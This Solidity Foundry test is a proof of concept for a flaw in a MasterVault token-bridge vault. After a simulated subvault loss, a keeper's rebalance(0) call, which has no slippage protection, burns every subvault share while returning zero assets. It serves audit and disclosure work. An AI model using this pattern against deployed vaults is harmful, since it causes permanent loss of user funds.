// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {MasterVaultCoreTest} from "./MasterVaultCore.t.sol";
import {MasterVault} from "../../../contracts/tokenbridge/libraries/vault/MasterVault.sol";
import {console2} from "forge-std/console2.sol";

contract PoCDrainBugTest is MasterVaultCoreTest {
    function test_drain_burns_shares_for_zero_assets() public {
        // 1. Setup: deposit 10e18, allocate 50% to subvault
        _setupWithAllocation(10e18, 5e17);

        uint256 subVaultSharesBefore = vault.subVault().balanceOf(address(vault));
        uint256 totalAssetsBefore = vault.totalAssets();
        console2.log("=== BEFORE ATTACK ===");
        console2.log("SubVault shares held by MasterVault:", subVaultSharesBefore);
        console2.log("Total assets:", totalAssetsBefore);
        console2.log("Idle balance:", token.balanceOf(address(vault)));
        console2.log("SubVault token balance:", token.balanceOf(address(vault.subVault())));

        // 2. Simulate subvault loss: drain all tokens from the subvault
        //    (simulates a hack, depeg, or temporary market dislocation)
        address subVaultAddr = address(vault.subVault());
        uint256 subVaultBalance = token.balanceOf(subVaultAddr);
        vm.prank(subVaultAddr);
        token.transfer(address(0xdead), subVaultBalance);

        console2.log("\n=== AFTER SUBVAULT LOSS ===");
        console2.log("SubVault shares held by MasterVault:", vault.subVault().balanceOf(address(vault)));
        console2.log("SubVault token balance:", token.balanceOf(subVaultAddr));
        console2.log("Total assets:", vault.totalAssets());

        // 3. Admin sets target to 0% to drain
        vault.setTargetAllocationWad(0);
        vm.warp(block.timestamp + 2);

        // 4. Keeper calls rebalance(0) -- no slippage protection
        vm.prank(keeper);
        vault.rebalance(0);

        // 5. Result: ALL shares burned, ZERO assets received
        uint256 subVaultSharesAfter = vault.subVault().balanceOf(address(vault));
        uint256 totalAssetsAfter = vault.totalAssets();

        console2.log("\n=== AFTER DRAIN ===");
        console2.log("SubVault shares held by MasterVault:", subVaultSharesAfter);
        console2.log("Total assets:", totalAssetsAfter);
        console2.log("Assets LOST:", totalAssetsBefore - totalAssetsAfter);

        // Shares are burned
        assertEq(subVaultSharesAfter, 0, "all shares should be burned");
        // But we got 0 assets back -- permanent loss
        assertTrue(totalAssetsAfter < totalAssetsBefore, "total assets should have decreased");
    }
}
